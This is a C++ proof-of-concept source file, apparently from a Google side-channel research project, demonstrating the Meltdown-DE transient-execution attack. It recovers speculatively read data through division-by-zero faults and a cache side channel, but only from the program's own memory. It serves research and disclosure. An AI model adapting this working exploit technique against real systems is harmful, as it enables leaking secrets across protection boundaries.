/*
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   https://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

/**
 * Demonstrates the Meltdown-DE on AMD and Intel.
 **/

#include "compiler_specifics.h"

#if !SAFESIDE_LINUX
#  error Unsupported OS. Linux required.
#endif

#if !SAFESIDE_IA32 && !SAFESIDE_X64
#  error Unsupported architecture. x86/64 required.
#endif

#include <array>
#include <cstring>
#include <iostream>

#include <signal.h>

#include "cache_sidechannel.h"
#include "instr.h"
#include "meltdown_local_content.h"
#include "utils.h"

const char *public_data = "Hello, world!";

char private_data [1000000];

// We must store zero as a global variable to avoid optimizing it out.
size_t zero = 0;

static char LeakByte(size_t offset, bool modulo) {
  CacheSideChannel sidechannel;
  const std::array<BigByte, 256> &isolated_oracle = sidechannel.GetOracle();

  for (int run = 0;; ++run) {
    size_t safe_offset = run % strlen(public_data);
    sidechannel.FlushOracle();

    ForceRead(isolated_oracle.data() + static_cast<size_t>(
        public_data[safe_offset]));

    // This fails with division exception. Whatever is the result of 1 % 0, it
    // cannot be more than 1 and first two characters are dummy in each private
    // string. During the modulo by zero, SIGFPE is raised and the signal
    // handler moves the instruction pointer to the afterspeculation label.
    if (modulo) {
      ForceRead(isolated_oracle.data() + static_cast<size_t>(
          private_data[offset % zero]));
    } else {
      ForceRead(isolated_oracle.data() + static_cast<size_t>(
          private_data[offset / zero]));
    }

    std::cout << "Dead code. Must not be printed." << std::endl;

    // The exit call must not be unconditional, otherwise clang would optimize
    // out everything that follows it and the linking would fail.
    if (strlen(public_data) != 0) {
      exit(EXIT_FAILURE);
    }

    // SIGFPE signal handler moves the instruction pointer to this label.
    asm volatile("afterspeculation:");

    std::pair<bool, char> result =
        sidechannel.RecomputeScores(public_data[safe_offset]);

    if (result.first) {
      return result.second;
    }

    if (run > 100000) {
      std::cerr << "Does not converge " << result.second << std::endl;
      exit(EXIT_FAILURE);
    }
  }
}

int main() {
  OnSignalMoveRipToAfterspeculation(SIGFPE);
  for (size_t i = 0; i < 1024; ++i) {
    size_t result = 0;
    size_t base = 1;
    for (size_t j = 0; j < 6; ++j) {
      for (size_t k = 0; k < 1000000; ++k) {
        private_data[k] = '0' + ((k / base) % 10);
      }
      result += (LeakByte(i, true) - '0') * base;
      base *= 10;
    }

    std::cout << i << " % 0 = " << result << std::endl;
  }

  for (size_t i = 0; i < 1024; ++i) {
    size_t result = 0;
    size_t base = 1;
    for (size_t j = 0; j < 6; ++j) {
      for (size_t k = 0; k < 1000000; ++k) {
        private_data[k] = '0' + ((k / base) % 10);
      }
      result += (LeakByte(i, false) - '0') * base;
      base *= 10;
    }

    std::cout << i << " / 0 = " << result << std::endl;
  }
}
